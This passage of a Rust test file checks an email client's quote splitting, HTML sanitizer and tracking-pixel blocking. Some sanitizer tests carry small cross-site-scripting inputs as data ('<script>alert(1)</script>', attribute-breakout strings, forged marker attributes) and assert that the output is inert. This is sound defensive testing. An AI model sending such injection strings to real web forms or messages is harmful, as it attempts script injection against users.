        assert!(!quoted.contains(n), "new content leaked into quote {n:?}\nquoted: {quoted}");
    }
    for q in quoted_must_have {
        assert!(quoted.contains(q), "quoted content lost {q:?}\nquoted: {quoted}");
        assert!(!s.new.contains(q), "quoted content leaked into new {q:?}\nnew: {}", s.new);
    }
}

#[test]
fn gmail_quote_div_splits() {
    let s = quotes::split_html(
        r#"<div dir="ltr">MY BRAND NEW REPLY</div>
           <div class="gmail_quote">
             <div dir="ltr" class="gmail_attr">On Tue, Aug 5, 2026 at 3:04 PM Bob &lt;bob@x.test&gt; wrote:<br></div>
             <blockquote class="gmail_quote" style="margin:0 0 0 .8ex;border-left:1px #ccc solid;padding-left:1ex">THE OLD MESSAGE</blockquote>
           </div>"#,
    );
    assert!(s.quoted.is_some(), "no quote detected");
    assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE", "wrote:"]);
}

#[test]
fn blockquote_type_cite_splits() {
    let s = quotes::split_html(
        r#"<div>MY BRAND NEW REPLY</div><br><blockquote type="cite"><div>THE OLD MESSAGE</div></blockquote>"#,
    );
    assert!(s.quoted.is_some(), "no quote detected");
    assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE"]);

    // Attribute order and quoting style must not matter.
    for open in [
        r#"<blockquote type=cite>"#,
        r#"<blockquote type='cite'>"#,
        r#"<blockquote cite="mid:1@x" type="cite">"#,
        r#"<BLOCKQUOTE TYPE="CITE">"#,
    ] {
        let html = format!("<p>MY BRAND NEW REPLY</p>{open}<p>THE OLD MESSAGE</p></blockquote>");
        let s = quotes::split_html(&html);
        assert!(s.quoted.is_some(), "no quote detected for {open:?}");
        assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE"]);
    }
}

#[test]
fn plain_blockquote_is_not_treated_as_a_quote() {
    // Marketing emails use <blockquote> for pull quotes. Collapsing those would
    // hide the actual message.
    let s = quotes::split_html(
        r#"<p>Intro</p><blockquote><p>A PULL QUOTE FROM OUR CEO</p></blockquote><p>Outro</p>"#,
    );
    assert!(s.quoted.is_none(), "pull quote misdetected: {s:#?}");
    assert!(s.new.contains("A PULL QUOTE FROM OUR CEO"));
    assert!(s.new.contains("Outro"));
}

#[test]
fn on_date_wrote_attribution_splits() {
    let s = quotes::split_html(
        r#"<div>MY BRAND NEW REPLY</div><div>On Wed, 6 Aug 2026 at 09:12, Alice &lt;alice@x.test&gt; wrote:</div><div>THE OLD MESSAGE</div>"#,
    );
    assert!(s.quoted.is_some(), "no quote detected: {s:#?}");
    assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE"]);
}

#[test]
fn wrote_without_an_attribution_is_not_a_quote() {
    // "wrote:" appears in ordinary prose all the time.
    for body in [
        r#"<p>Our founder wrote: this is the best product ever. BUY NOW</p>"#,
        r#"<p>She wrote: hello</p>"#,
    ] {
        let s = quotes::split_html(body);
        assert!(s.quoted.is_none(), "false positive on {body:?}: {s:#?}");
    }
}

#[test]
fn outlook_markers_split() {
    for marker in [
        r#"<div id="divRplyFwdMsg">"#,
        r#"<div id="mail-editor-reference-message-container">"#,
        r#"<div style="border:none;border-top:solid #E1E1E1 1.0pt;padding:3.0pt 0in 0in 0in">"#,
        r#"<div>________________________________</div><div>"#,
        r#"<div>-----Original Message-----</div><div>"#,
        r#"<div>Begin forwarded message:</div><div>"#,
        r#"<div>---------- Forwarded message ---------</div><div>"#,
    ] {
        let html = format!("<p>MY BRAND NEW REPLY</p>{marker}<p>THE OLD MESSAGE</p></div>");
        let s = quotes::split_html(&html);
        assert!(s.quoted.is_some(), "no quote detected for {marker:?}");
        assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE"]);
    }
}

#[test]
fn earliest_marker_wins() {
    // Gmail nests an attribution line inside the quote container. Splitting on
    // the attribution rather than the container would leave a stray open div.
    let s = quotes::split_html(
        r#"<div>MY BRAND NEW REPLY</div><div class="gmail_quote"><div class="gmail_attr">On Tue, Aug 5, 2026, Bob wrote:</div><blockquote type="cite">THE OLD MESSAGE</blockquote></div>"#,
    );
    let quoted = s.quoted.as_deref().unwrap();
    assert!(quoted.contains("gmail_quote"), "split below the container: {quoted}");
    assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE"]);
}

#[test]
fn no_quoting_returns_everything_as_new() {
    for body in [
        r#"<p>Just a message.</p>"#,
        r#"<table><tr><td><h1>NEWSLETTER</h1><p>Buy now</p></td></tr></table>"#,
        "",
    ] {
        let s = quotes::split_html(body);
        assert!(s.quoted.is_none(), "false positive for {body:?}: {s:#?}");
        assert_eq!(s.new, body);
    }
}

#[test]
fn top_posted_forward_with_no_new_text_is_all_quote() {
    let s = quotes::split_html(
        r#"<div class="gmail_quote"><blockquote type="cite">THE OLD MESSAGE</blockquote></div>"#,
    );
    assert!(s.quoted.is_some());
    assert!(s.new.trim().is_empty(), "invented new content: {:?}", s.new);
    assert!(s.quoted.as_deref().unwrap().contains("THE OLD MESSAGE"));
}

#[test]
fn plain_text_angle_quoting_splits() {
    let s = quotes::split_text(
        "MY BRAND NEW REPLY\n\nOn Tue, Aug 5, 2026 at 3:04 PM Bob <bob@x.test> wrote:\n> THE OLD MESSAGE\n> second quoted line\n",
    );
    assert!(s.quoted.is_some(), "{s:#?}");
    assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE", "second quoted line"]);
    // The attribution belongs with the quote it introduces.
    assert!(s.quoted.as_deref().unwrap().contains("wrote:"), "{s:#?}");
}

#[test]
fn plain_text_quoting_without_attribution_splits() {
    let s = quotes::split_text("MY BRAND NEW REPLY\n\n> THE OLD MESSAGE\n>> older still\n");
    assert!(s.quoted.is_some(), "{s:#?}");
    assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE", "older still"]);
}

#[test]
fn plain_text_signature_is_not_a_quote() {
    let s = quotes::split_text("MY BRAND NEW REPLY\n\n-- \nAlex\nSent from a computer\n");
    assert!(s.quoted.is_none(), "signature misdetected: {s:#?}");
    assert!(s.new.contains("Alex"));
}

#[test]
fn plain_text_original_message_marker_splits() {
    let s = quotes::split_text(
        "MY BRAND NEW REPLY\n\n-----Original Message-----\nFrom: Bob\nSent: Tuesday\n\nTHE OLD MESSAGE\n",
    );
    assert!(s.quoted.is_some(), "{s:#?}");
    assert_split(&s, &["MY BRAND NEW REPLY"], &["THE OLD MESSAGE"]);
}

#[test]
fn plain_text_with_no_quote_returns_everything() {
    let s = quotes::split_text("Hello.\n\nThanks,\nAlex\n");
    assert!(s.quoted.is_none(), "{s:#?}");
    assert!(s.new.contains("Alex"));
}

// ===========================================================================
// 8. End-to-end
// ===========================================================================

#[test]
fn render_html_reports_quote_and_sanitizes_both_halves() {
    let r = render_html(
        r#"<div>MY BRAND NEW REPLY<script>alert(1)</script></div>
           <div class="gmail_quote">
             <div>On Tue, Aug 5, 2026, Bob wrote:</div>
             <blockquote type="cite">THE OLD MESSAGE<img src="https://tracker.test/p.gif"><img src="https://tracker.test/q.gif"></blockquote>
           </div>"#,
    );
    assert!(r.has_quoted);
    assert!(r.html.contains("MY BRAND NEW REPLY"));
    assert!(!r.html.contains("THE OLD MESSAGE"));
    assert!(r.quoted_html.contains("THE OLD MESSAGE"));
    assert_inert(&r.html);
    assert_inert(&r.quoted_html);
    // Images hidden inside the quote still count — the privacy decision is
    // about the whole message, not the visible part.
    assert_eq!(r.blocked_remote_images, 2, "{r:#?}");
}

#[test]
fn render_text_splits_and_escapes() {
    let r = render_text("MY BRAND NEW REPLY <not a tag>\n\n> THE OLD MESSAGE <also not>\n");
    assert!(r.has_quoted, "{r:#?}");
    assert!(r.html.contains("MY BRAND NEW REPLY"));
    assert!(r.html.contains("&lt;not a tag&gt;"), "{}", r.html);
    assert!(r.quoted_html.contains("THE OLD MESSAGE"));
    assert!(r.quoted_html.contains("&lt;also not&gt;"), "{}", r.quoted_html);
    assert_inert(&r.html);
    assert_inert(&r.quoted_html);
}

#[test]
fn ugly_marketing_email_survives_and_stays_readable() {
    let body = r##"<!--[if mso]><style>.x{}</style><![endif]-->
<table width="100%" cellpadding="0" cellspacing="0" border="0" bgcolor="#f4f4f4" style="background-color:#f4f4f4">
  <tr>
    <td align="center" style="padding:24px 0">
      <table width="600" cellpadding="0" cellspacing="0" border="0" style="width:600px;max-width:600px;background:#ffffff;border:1px solid #e0e0e0">
        <tr>
          <td align="center" style="padding:32px 24px 16px">
            <a href="https://shop.test/?utm_source=email&amp;utm_campaign=aug" target="_top">
              <img src="https://cdn.test/logo@2x.png" width="180" height="40" alt="Acme" border="0" style="display:block">
            </a>
          </td>
        </tr>
        <tr>
          <td style="padding:0 24px 24px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;font-size:16px;line-height:24px;color:#333333">
            <h1 style="font-size:28px;margin:0 0 12px;color:#111111">SUMMER SALE</h1>
            <p style="margin:0 0 16px">Everything must go. <b>Up to 60% off</b> through Sunday.</p>
            <table cellpadding="0" cellspacing="0" border="0" align="center">
              <tr><td bgcolor="#ff5722" style="border-radius:4px;padding:12px 28px">
                <a href="https://shop.test/sale" style="color:#ffffff;text-decoration:none;font-weight:bold">SHOP NOW</a>
              </td></tr>
            </table>
            <p style="font-size:12px;color:#888888;margin:24px 0 0">
              <a href="https://shop.test/unsubscribe?u=abc">UNSUBSCRIBE</a> &middot; 123 Fake St
            </p>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>
<img src="https://tracker.test/open?u=abc" width="1" height="1" alt="">"##;

    let r = render_html(body);
    assert_inert(&r.html);
    assert!(!r.has_quoted, "marketing mail misdetected as a quote");

    for text in ["SUMMER SALE", "Up to 60% off", "SHOP NOW", "UNSUBSCRIBE", "123 Fake St"] {
        assert!(r.html.contains(text), "lost {text:?}:\n{}", r.html);
    }
    // Table layout must survive or the email becomes an unreadable column.
    for tag in ["<table", "<tr", "<td", "<h1", "<b>"] {
        assert!(r.html.contains(tag), "lost {tag:?}:\n{}", r.html);
    }
    assert!(r.html.contains("bgcolor=\"#ff5722\""), "{}", r.html);
    assert!(r.html.contains("cellpadding"), "{}", r.html);
    assert!(r.html.contains("width=\"600\""), "{}", r.html);
    assert!(r.html.contains("max-width:600px"), "{}", r.html);
    assert!(r.html.contains("https://shop.test/sale"), "{}", r.html);
    assert_eq!(r.blocked_remote_images, 2, "{r:#?}");
    assert!(r.html.contains(r#"data-mach-blocked-src="https://tracker.test/open?u=abc""#), "{}", r.html);
}

#[test]
fn pathological_input_does_not_blow_up() {
    // Deeply nested markup: a mail client must not be crashable by a stranger.
    let deep = format!("{}hello{}", "<div>".repeat(5_000), "</div>".repeat(5_000));
    let r = render_html(&deep);
    assert!(r.html.contains("hello"));

    // Unclosed tags all the way down.
    let deep_open = "<div>".repeat(5_000);
    let _ = render_html(&deep_open);

    // A very long single attribute value.
    let long = format!(r#"<div title="{}">x</div>"#, "a".repeat(100_000));
    let r = render_html(&long);
    assert!(r.html.contains('x'));

    // Huge plain text.
    let r = render_text(&"word http://ok.test/ ".repeat(5_000));
    assert!(r.html.contains("ok.test"));
}

#[test]
fn sanitizer_output_is_a_fixed_point_for_realistic_bodies() {
    // Checked with images allowed, because the blocked-image rewrite is
    // deliberately *not* idempotent: a second pass strips the data-mach-*
    // attributes the first pass added, since a sender must never be able to
    // supply them. See `re_sanitizing_blocked_output_drops_our_own_markers`.
    for body in [
        r#"<p>plain</p>"#,
        r#"<img src="https://cdn.test/a.png" alt="a">"#,
        r#"<a href="https://ok.test/">link</a>"#,
        r#"<table><tr><td style="color:red">cell</td></tr></table>"#,
        r#"<div style="font-family:'Helvetica Neue',Arial">x</div>"#,
    ] {
        let once = sanitize_fragment(body, true).0;
        let twice = sanitize_fragment(&once, true).0;
        assert_eq!(once, twice, "not idempotent for {body:?}");
    }
}

#[test]
fn re_sanitizing_blocked_output_drops_our_own_markers() {
    // The sanitizer cannot tell its own previous output from a sender's
    // forgery, so it must trust neither. Re-running it is safe but lossy, and
    // callers therefore sanitize the raw body once rather than re-cleaning.
    let once = clean(r#"<img src="https://cdn.test/a.png" alt="a">"#);
    assert!(once.contains("data-mach-blocked-src"));
    let twice = clean(&once);
    assert!(!twice.contains("data-mach-blocked-src"), "{twice}");
    assert!(!twice.contains("cdn.test"), "{twice}");
    assert_inert(&twice);
}

// ===========================================================================
// 5b. Tracking pixels, with remote images allowed
//
// The default is now "load the images" — a mail client that hides the pictures
// is not showing you your mail — so the interesting question moved. It is no
// longer "is everything blocked" but "is the thing that was never a picture
// blocked, and is the picture still there".
// ===========================================================================

/// Render with the new default: images on, trackers off.
fn allow(html: &str) -> mach_lib::render::RenderedBody {
    render_html_with(
        html,
        RenderOptions {
            allow_remote_images: true,
        },
    )
}

#[test]
fn tiny_images_are_blocked_as_trackers_and_real_ones_are_not() {
    for tiny in [
        r#"<img src="https://t.test/a" width="1" height="1">"#,
        r#"<img src="https://t.test/a" width="1">"#,
        r#"<img src="https://t.test/a" height="1">"#,
        r#"<img src="https://t.test/a" width="3" height="3">"#,
        r#"<img src="https://t.test/a" width="600" height="2">"#,
        r#"<img src="https://t.test/a" style="width:1px;height:1px">"#,
        r#"<img src="https://t.test/a" width="0" height="0">"#,
        r#"<img src="https://t.test/a" width=" 1 " height="1px">"#,
    ] {
        let r = allow(tiny);
        assert_eq!(r.blocked_trackers, 1, "not caught: {tiny}\n{}", r.html);
        assert!(!r.html.contains("t.test"), "URL survived: {}", r.html);
        assert!(r.html.contains("data-mach-tracker"), "{}", r.html);
        assert_inert(&r.html);
    }

    for real in [
        r#"<img src="https://cdn.test/hero.png" width="600" height="400">"#,
        r#"<img src="https://cdn.test/hero.png" width="4" height="4">"#,
        r#"<img src="https://cdn.test/hero.png" width="100%">"#,
        r#"<img src="https://cdn.test/hero.png" style="width:600px">"#,
    ] {
        let r = allow(real);
        assert_eq!(r.blocked_trackers, 0, "false positive: {real}\n{}", r.html);
        assert!(
            r.html.contains(r#"src="https://cdn.test/hero.png""#),
            "image lost: {}",
            r.html
        );
    }
}

#[test]
fn images_hidden_with_css_are_blocked_as_trackers() {
    // `visibility` and `opacity` are not allowed CSS properties, so without the
    // fold in `sanitize_style` a sender could hide a pixel from every other
    // client and have Mach both show it *and* fetch it.
    for hidden in [
        r#"<img src="https://t.test/p.png" style="display:none">"#,
        r#"<img src="https://t.test/p.png" style="visibility:hidden">"#,
        r#"<img src="https://t.test/p.png" style="visibility:collapse">"#,
        r#"<img src="https://t.test/p.png" style="opacity:0">"#,
        r#"<img src="https://t.test/p.png" style="opacity:0.0">"#,
        r#"<img src="https://t.test/p.png" style="color:red;DISPLAY:  NONE">"#,
        r#"<img src="https://t.test/p.png" style="max-height:1px">"#,
    ] {
        let r = allow(hidden);
        assert_eq!(r.blocked_trackers, 1, "not caught: {hidden}\n{}", r.html);
        assert!(!r.html.contains("t.test"), "URL survived: {}", r.html);
        assert_inert(&r.html);
    }

    // An ordinary visible image with a style attribute is left alone.
    let r = allow(r#"<img src="https://cdn.test/hero.png" style="display:block">"#);
    assert_eq!(r.blocked_trackers, 0, "{}", r.html);
    assert!(r.html.contains("cdn.test/hero.png"), "{}", r.html);
}

#[test]
fn dimensionless_open_tracking_urls_are_blocked() {
    for url in [
        "https://t.test/open?u=abc",
        "https://t.test/wf/open?upn=xyz",
        "https://t.test/e/pixel/12345",
        "https://t.test/track/abc.gif",
        "https://t.test/beacon?id=1",
        "https://t.test/imp/9",
        "https://t.test/collect?v=1&utm_source=news",
        "https://t.test/img/spacer.gif",
        "https://t.test/assets/1x1.gif",
        "https://t.test/i/blank.gif",
        "https://t.test/img/transparent.png",
    ] {
        let r = allow(&format!(r#"<img src="{url}">"#));
        assert_eq!(r.blocked_trackers, 1, "not caught: {url}\n{}", r.html);
        assert!(!r.html.contains("t.test"), "URL survived: {}", r.html);
    }

    // ...but a URL that merely *contains* one of those words is a picture.
    // Segments and stems are matched whole, never as substrings.
    for url in [
        "https://cdn.test/images/opengraph.png",
        "https://cdn.test/tracksuit-navy.jpg",
        "https://cdn.test/pixelart/hero.png",
        "https://cdn.test/logo.png",
        "https://cdn.test/a.png",
        "https://cdn.test/products/beacon-lamp.jpeg",
    ] {
        let r = allow(&format!(r#"<img src="{url}">"#));
        assert_eq!(r.blocked_trackers, 0, "false positive: {url}\n{}", r.html);
        assert!(r.html.contains(url), "image lost: {}", r.html);
    }
}

#[test]
fn a_tracker_shaped_url_with_real_dimensions_is_left_alone() {
    // A 600x200 banner served from /track/ is a banner. Only the shapeless ones
    // are judged on their URL, because a sender who declares a real size has
    // told us it is meant to be looked at.
    let r = allow(r#"<img src="https://t.test/track/banner.png" width="600" height="200">"#);
    assert_eq!(r.blocked_trackers, 0, "{}", r.html);
    assert!(r.html.contains("t.test/track/banner.png"), "{}", r.html);
}

#[test]
fn blocking_trackers_leaves_the_rest_of_the_message_alone() {
    let body = r##"<p>Hello <b>you</b></p>
<img src="https://cdn.test/hero.png" width="600" height="300" alt="Hero">
<a href="https://shop.test/sale">SHOP</a>
<img src="https://t.test/open?u=1" width="1" height="1" alt="">
<img src="cid:logo@mach.local" alt="Logo">
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="dot">"##;

    let r = allow(body);
    assert_eq!(r.blocked_trackers, 1, "{r:#?}");
    // The counter is honest: nothing is waiting behind a "load images" button.
    assert_eq!(r.blocked_remote_images, 0, "{r:#?}");
    assert_eq!(r.inline_cid_images, 1, "{r:#?}");
    assert_eq!(r.inline_data_images, 1, "{r:#?}");

    assert!(r.html.contains("Hello"), "{}", r.html);
    assert!(r.html.contains(r#"src="https://cdn.test/hero.png""#), "{}", r.html);
    assert!(r.html.contains("https://shop.test/sale"), "{}", r.html);
    assert!(r.html.contains(r#"alt="Hero""#), "{}", r.html);
    assert!(r.html.contains("data-mach-cid"), "{}", r.html);
    assert!(!r.html.contains("t.test"), "tracker URL survived: {}", r.html);
    assert_inert(&r.html);
}

#[test]
fn trackers_inside_quoted_history_count_too() {
    let r = allow(
        r#"<div>new</div>
           <div class="gmail_quote">
             <blockquote type="cite">old<img src="https://t.test/open" width="1" height="1"></blockquote>
           </div>"#,
    );
    assert!(r.has_quoted);
    assert_eq!(r.blocked_trackers, 1, "{r:#?}");
    assert!(!r.quoted_html.contains("t.test"), "{}", r.quoted_html);
}

#[test]
fn blocking_everything_still_works_and_still_counts_images_not_trackers() {
    // The preference-shaped escape hatch. `allow_remote_images: false` is what
    // BLOCK_ALL_REMOTE_IMAGES on the frontend asks for, and it must behave
    // exactly as it did before trackers existed: everything deferred, nothing
    // reclassified, the "load images" button meaningful.
    let body = r#"<img src="https://t.test/open?u=1" width="1" height="1">
                  <img src="https://cdn.test/hero.png" width="600">"#;
    let r = render_html(body);
    assert_eq!(r.blocked_remote_images, 2, "{r:#?}");
    assert_eq!(r.blocked_trackers, 0, "{r:#?}");
    assert!(r.html.contains(r#"data-mach-blocked-src="https://t.test/open?u=1""#), "{}", r.html);
    assert!(!r.html.contains("data-mach-tracker"), "{}", r.html);
}

#[test]
fn a_sender_cannot_forge_the_tracker_marker_to_hide_content() {
    // `data-mach-tracker` makes the frame stylesheet hide the element. If a
    // sender could set it they could hide arbitrary parts of their own message
    // from the reader while other clients showed them.
    let r = allow(
        r#"<img data-mach-tracker="" src="https://cdn.test/hero.png" width="600" height="400">
           <div data-mach-tracker="">important</div>"#,
    );
    assert_eq!(r.html.matches("data-mach-tracker").count(), 0, "{}", r.html);
    assert!(r.html.contains("important"), "{}", r.html);
}

#[test]
fn tracker_blocking_survives_hostile_attribute_values() {
    // The rewrite splices around byte ranges in ammonia's output. Values that
    // contain the characters the scanner keys on must not let a sender steer it.
    for body in [
        r#"<img src="https://t.test/open" alt="&quot;&gt; <script>alert(1)</script>" width="1">"#,
        r#"<img alt='a">b' src="https://t.test/open" width="1" height="1">"#,
        r#"<img src="https://t.test/open" title="x=&quot;y&quot;" width="1"/>"#,
        r#"<img src="https://t.test/open" width="1"><img src="https://t.test/open" width="1">"#,
    ] {
        let r = allow(body);
        assert!(r.blocked_trackers >= 1, "not caught: {body}\n{}", r.html);
        assert!(!r.html.contains("t.test"), "URL survived: {}", r.html);
        assert_inert(&r.html);
    }
}

#[test]
fn declared_size_is_read_from_the_declaration_that_actually_renders() {
    // CSS beats the presentational attribute on screen, so it must beat it here
    // in both directions — otherwise a sender writes `width="600"` next to
    // `style="width:1px"` and gets a pixel Mach treats as a picture.
    let r = allow(r#"<img src="https://t.test/a.png" width="600" style="width:1px">"#);
    assert_eq!(r.blocked_trackers, 1, "{}", r.html);

    let r = allow(r#"<img src="https://cdn.test/a.png" width="1" style="width:600px">"#);
    assert_eq!(r.blocked_trackers, 0, "{}", r.html);
    assert!(r.html.contains("cdn.test/a.png"), "{}", r.html);

    // A size announced after some other declaration is still a size. (An earlier
    // version gave up at the first fragment without a colon.)
    let r = allow(r#"<img src="https://t.test/a.png" style="color:red;margin:0;width:2px">"#);
    assert_eq!(r.blocked_trackers, 1, "{}", r.html);
}
